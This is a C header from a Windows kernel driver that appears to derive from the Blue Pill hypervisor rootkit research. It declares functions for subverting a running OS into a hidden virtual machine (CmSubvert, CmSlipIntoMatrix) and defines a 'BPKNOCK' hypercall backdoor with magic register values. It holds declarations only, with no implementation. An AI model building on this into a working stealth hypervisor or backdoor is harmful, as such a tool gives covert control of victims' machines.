#pragma once

#include <ntddk.h>
#include "PrintInfos.h"
//#include "hvm.h"

//+++++++++++++++++++++Definitions+++++++++++++++++++++++++++

// ---------------- GENERAL CONFIG (both SVM & VMX) ------------------------  

// DEBUG settings -------------
//#define	ENABLE_DEBUG_PRINTS
#define ITL_TAG	'LTI'

#define	DEBUG_LEVEL	2

#define USE_DEBUG_LIBRUARY

//#define USE_LOCAL_DBGPRINTS
//#define USE_COM_PRINTS

//#ifdef USE_COM_PRINTS
//# define	COM_PORT_ADDRESS	0x3f8
	// com1 0x3f8
	// com2 0x2f8
	// com3 0x3e8
	// com4 0x2e8

//#define COMPRINT_OVERFLOW_PROTECTION
// allow to ComPrint no more then QUEUE_SZ lines of output within QUEUE_TH cycles
//# define COMPRINT_QUEUE_SZ 0x100
//# define COMPRINT_QUEUE_TH 0x200000000
//# define COMPRINT_SLEEP 10000000000     // wait this many cycles after an overflow condition
//#endif // USE_COM_PRINTS

// Various common settings ----- 
#define	ENABLE_HYPERCALLS
//#define       SET_PCD_BIT     // Set PCD for BP's pages (Non Cached)

// BPKNOCK backdoor -------
#define BP_KNOCK
#ifdef BP_KNOCK
	#define BP_KNOCK_EAX	100
	#define BP_KNOCK_EAX_ANSWER 0x48656c6c	//Hell
	#define BP_KNOCK_EBX_ANSWER 0x6f20576f  //o Wo
	#define BP_KNOCK_EDX_ANSWER 0x726c6421	//rld!

	#define BP_EXIT_EAX		200
#endif // BP_KNOCK

#ifdef USE_DEBUG_LIBRUARY
#define Print(x) WriteDbgInfo x
#else
#define Print(x) {}
#endif

#define REG_MASK			0x07

#define REG_GP				0x08
#define REG_GP_ADDITIONAL	0x10
#define REG_CONTROL			0x20
#define REG_DEBUG			0x40
#define REG_RFLAGS			0x80

#define	REG_RAX	REG_GP | 0
#define REG_RCX	REG_GP | 1
#define REG_RDX	REG_GP | 2
#define REG_RBX	REG_GP | 3
#define REG_RSP	REG_GP | 4
#define REG_RBP	REG_GP | 5
#define REG_RSI	REG_GP | 6
#define REG_RDI	REG_GP | 7

#define REG_CR0	REG_CONTROL | 0
#define REG_CR2	REG_CONTROL | 2
#define REG_CR3	REG_CONTROL | 3
#define REG_CR4	REG_CONTROL | 4

typedef NTSTATUS (
  NTAPI * PCALLBACK_PROC
) (
  PVOID Param
);

typedef struct _CPU *PCPU;

typedef struct _GUEST_REGS
{
  ULONG32 eax;                  // 0x00         // NOT VALID FOR SVM
  ULONG32 ecx;
  ULONG32 edx;                  // 0x08
  ULONG32 ebx;
  ULONG32 esp;                  // esp is not stored here on SVM
  ULONG32 ebp;
  ULONG32 esi;
  ULONG32 edi;
} GUEST_REGS,
 *PGUEST_REGS;

typedef BOOLEAN (NTAPI * ARCH_IS_HVM_IMPLEMENTED) (
);

typedef NTSTATUS (NTAPI * ARCH_INITIALIZE) (
  PCPU Cpu,
  PVOID GuestERip,
  PVOID GuestEsp
);

typedef NTSTATUS (NTAPI * ARCH_VIRTUALIZE) (
  PCPU Cpu
);

typedef NTSTATUS (NTAPI * ARCH_SHUTDOWN) (
  PCPU Cpu,
  PGUEST_REGS GuestRegs,
  BOOLEAN bSetupTimeBomb
);

typedef BOOLEAN (NTAPI * ARCH_IS_NESTED_EVENT) (
  PCPU Cpu,
  PGUEST_REGS GuestRegs
);

typedef VOID (NTAPI * ARCH_DISPATCH_NESTED_EVENT) (
  PCPU Cpu,
  PGUEST_REGS GuestRegs
);

typedef VOID (NTAPI * ARCH_DISPATCH_EVENT) (
  PCPU Cpu,
  PGUEST_REGS GuestRegs
);

typedef VOID (NTAPI * ARCH_ADJUST_RIP) (
  PCPU Cpu,
  PGUEST_REGS GuestRegs,
  ULONG Delta
);

typedef NTSTATUS (NTAPI * ARCH_REGISTER_TRAPS) (
  PCPU Cpu
);

typedef BOOLEAN (NTAPI * ARCH_IS_TRAP_VALID) (
  ULONG TrappedVmExit
);                              //add by cini


//+++++++++++++++++++++Structs++++++++++++++++++++++++++++++++

typedef struct
{
  UCHAR Architecture;

  ARCH_IS_HVM_IMPLEMENTED ArchIsHvmImplemented;

  ARCH_INITIALIZE ArchInitialize;
  ARCH_VIRTUALIZE ArchVirtualize;
  ARCH_SHUTDOWN ArchShutdown;

  //ARCH_IS_NESTED_EVENT ArchIsNestedEvent;
  //ARCH_DISPATCH_NESTED_EVENT ArchDispatchNestedEvent;
  ARCH_DISPATCH_EVENT ArchDispatchEvent;
  ARCH_ADJUST_RIP ArchAdjustRip;
  ARCH_REGISTER_TRAPS ArchRegisterTraps;
  ARCH_IS_TRAP_VALID ArchIsTrapValid;
} HVM_DEPENDENT,
 *PHVM_DEPENDENT;

/* 
* Attribute for segment selector. This is a copy of bit 40:47 & 52:55 of the
* segment descriptor. 
*/
typedef union
{
  USHORT UCHARs;
  struct
  {
    USHORT type:4;              /* 0;  Bit 40-43 */
    USHORT s:1;                 /* 4;  Bit 44 */
    USHORT dpl:2;               /* 5;  Bit 45-46 */
    USHORT p:1;                 /* 7;  Bit 47 */
    // gap!       
    USHORT avl:1;               /* 8;  Bit 52 */
    USHORT l:1;                 /* 9;  Bit 53 */
    USHORT db:1;                /* 10; Bit 54 */
    USHORT g:1;                 /* 11; Bit 55 */
    USHORT Gap:4;
  } fields;
} SEGMENT_ATTRIBUTES;

typedef struct
{
  USHORT sel;
  SEGMENT_ATTRIBUTES attributes;
  ULONG32 limit;
  ULONG64 base;
} SEGMENT_SELECTOR;

typedef struct
{
  USHORT limit0;
  USHORT base0;
  UCHAR base1;
  UCHAR attr0;
  UCHAR limit1attr1;
  UCHAR base2;
} SEGMENT_DESCRIPTOR,
 *PSEGMENT_DESCRIPTOR;

//+++++++++++++++++++++Public Functions++++++++++++++++++++++++


//VOID NTAPI CmClgi (
//);

//VOID NTAPI CmStgi (
//);

VOID NTAPI CmCli (
);

VOID NTAPI CmSti (
);

VOID NTAPI CmDebugBreak (
);

VOID NTAPI CmWbinvd (
);

VOID NTAPI CmClflush (
  PVOID mem8
);

VOID NTAPI CmInvalidatePage (
  PVOID Page
);

VOID NTAPI CmReloadGdtr (
  PVOID GdtBase,
  ULONG GdtLimit
);

VOID NTAPI CmReloadIdtr (
  PVOID IdtBase,
  ULONG IdtLimit
);

//VOID NTAPI CmSetBluepillESDS (
//);

//VOID NTAPI CmSetBluepillGS (
//);

//VOID NTAPI CmSetDS (
//  USHORT Selector
//);
//
//VOID NTAPI CmSetES (
//  USHORT Selector
//);

VOID NTAPI CmSetFS (
  ULONG Selector
);

VOID NTAPI CmSetGS (
  ULONG Selector
);

VOID NTAPI CmFreePhysPages (
  PVOID BaseAddress,
  ULONG uNoOfPages
);

NTSTATUS NTAPI CmSubvert (
  PVOID
);

NTSTATUS NTAPI CmSlipIntoMatrix (
  PVOID
);

/**
 * effects:To see if the indicated bit is set or not.
 * requires: 0<=bitNo<=63
 */
BOOLEAN CmIsBitSet (
  ULONG64 v,
  UCHAR bitNo
);

/**
 * effects:Raise the interruption level to dispatch level, then
 * install VM Root hypervisor by call <CallbackProc>
 */
NTSTATUS NTAPI CmDeliverToProcessor (
  CCHAR cProcessorNumber,
  PCALLBACK_PROC CallbackProc,
  PVOID CallbackParam,
  PNTSTATUS pCallbackStatus
);

/**
 * effects:This method is invoked by HvmSwallowBluepill, and its 
 * main job is to store the GuestOS (Windows)'s enviroment, currently 
 * it stores only the data in the registers. Other env data will 
 * be saved in the further steps.
 **/
NTSTATUS NTAPI CmSubvert (
  PVOID
);
/**
 * effects:这个方法不知道做什么。。。
 */
NTSTATUS NTAPI CmInitializeSegmentSelector (
    SEGMENT_SELECTOR *pSegmentSelector,
    USHORT Selector,
    PUCHAR GdtBase
);
/**
 * effects:这个方法不知道做什么。。。
 */
NTSTATUS NTAPI CmGenerateMovReg (
  PUCHAR pCode,
  PULONG pGeneratedCodeLength,
  ULONG Register,
  ULONG Value
);
/**
 * effects:这个方法不知道做什么。。。
 */
NTSTATUS NTAPI CmGeneratePushReg (
    PUCHAR pCode,
    PULONG pGeneratedCodeLength,
    ULONG Register
);
/**
 * effects:这个方法不知道做什么。。。
 */
NTSTATUS NTAPI CmGenerateIretd (
    PUCHAR pCode,
    PULONG pGeneratedCodeLength
);